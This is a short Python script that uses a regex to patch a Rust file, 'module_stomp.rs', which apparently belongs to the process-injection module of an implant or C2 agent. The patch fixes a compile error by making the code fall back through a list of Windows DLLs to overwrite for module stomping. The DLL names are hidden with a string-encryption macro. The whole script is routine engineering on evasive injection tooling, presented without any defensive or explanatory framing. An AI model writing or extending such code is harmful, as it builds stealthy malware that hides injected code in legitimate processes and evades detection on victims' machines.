import re

with open("agent/src/injection/module_stomp.rs", "r") as f:
    text = f.read()

# Fix the lifetime error by repeating iteration logic
text = re.sub(
    r"let target_dll_str = enc_str!\(\"msfte.dll\"\);\s*let target_dll = target_dll_str.as_ref();.*?let \(\mut h_proc, mut target_base\) = match target_dll_search\(candidates\) {.*?}",
    r'''let (mut h_proc, mut target_base) = match target_dll_search(vec![enc_str!("msfte.dll").as_ref()]) {
                Ok(res) => res,
                Err(_) => match target_dll_search(vec![enc_str!("msratelc.dll").as_ref()]) {
                    Ok(res) => res,
                    Err(_) => match target_dll_search(vec![enc_str!("scrobj.dll").as_ref()]) {
                        Ok(res) => res,
                        Err(_) => match target_dll_search(vec![enc_str!("amstream.dll").as_ref()]) {
                            Ok(res) => res,
                            Err(_) => return Err(anyhow::anyhow!("No target dll found"))
                        }
                    }
                }
            };''',
    text, flags=re.DOTALL
)

with open("agent/src/injection/module_stomp.rs", "w") as f:
    f.write(text)

